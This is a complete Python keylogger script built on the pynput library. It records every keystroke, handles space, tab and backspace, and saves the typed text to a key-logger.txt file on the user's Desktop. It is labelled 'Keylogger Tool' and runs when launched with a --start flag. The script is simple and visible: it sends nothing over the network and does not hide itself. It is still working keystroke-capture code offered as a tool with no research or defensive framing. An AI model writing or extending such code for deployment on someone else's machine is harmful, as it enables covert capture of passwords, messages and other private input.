from pynput import keyboard
import os
import argparse

# Define the path for the log file on the desktop
desktop_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "key-logger.txt")
typed_text = ""

# Function that is called when a key is pressed
def keyPressed(key):
    global typed_text
    # Stop the listener if the Esc key is pressed
    if key == keyboard.Key.esc:
        return False 
    # Add a space when the space key is pressed
    elif str(key) == "Key.space":
        typed_text += " "
    # Add a space when the tab key is pressed
    elif str(key) == "Key.tab":
        typed_text += " "
    # Remove the last character when the backspace key is pressed
    elif str(key) == "Key.backspace":
        typed_text = typed_text[:-1]
    else:
        try:
            typed_text += key.char  # Append the character
        except AttributeError:
            print(f"{str(key)}")  # Print special keys if they cannot be captured
            
    # Write the typed text to the log file
    with open(desktop_file_path, "w") as file:
        file.write(typed_text)    

def main():
    # Set up argument parser for command line options
    parser = argparse.ArgumentParser(description="Keylogger Tool")
    parser.add_argument('--start', action='store_true', help="Starts the keylogger")
    args = parser.parse_args()

    if args.start:
        print("Starting the keylogger...")
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input()  # Keep the program running until Enter is pressed

if __name__ == "__main__":
    main()  # Execute the main function when the script is run
    